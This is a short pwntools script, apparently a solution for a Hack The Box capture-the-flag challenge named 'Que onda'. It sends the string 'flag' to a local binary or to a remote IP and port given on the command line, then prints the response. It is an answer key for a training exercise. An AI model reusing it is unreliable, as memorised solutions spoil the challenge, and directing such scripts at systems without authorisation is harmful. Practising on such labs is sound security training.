#!/usr/bin/env python3
from pwn import *
import argparse

def build_payload():
    return b"flag\n"

def run_local(binary_path):
    p = process(binary_path)
    p.send(build_payload())
    return p.recvall().decode()

def run_remote(ip, port):
    p = remote(ip, int(port))
    p.send(build_payload())
    return p.recvall().decode()

def main():
    parser = argparse.ArgumentParser(description="Exploit for Que onda challenge (HTB)")
    parser.add_argument("--remote", action="store_true", help="Run against remote target")
    parser.add_argument("--ip", help="Remote IP address")
    parser.add_argument("--port", help="Remote port")
    parser.add_argument("--binary", default="./que_onda", help="Local binary path (default: ./que_onda)")
    args = parser.parse_args()

    if args.remote:
        if not args.ip or not args.port:
            print("[!] You must provide both --ip and --port in remote mode.")
            return
        result = run_remote(args.ip, args.port)
    else:
        result = run_local(args.binary)

    print("[+] Response from target:\n")
    print(result)

if __name__ == "__main__":
    main()

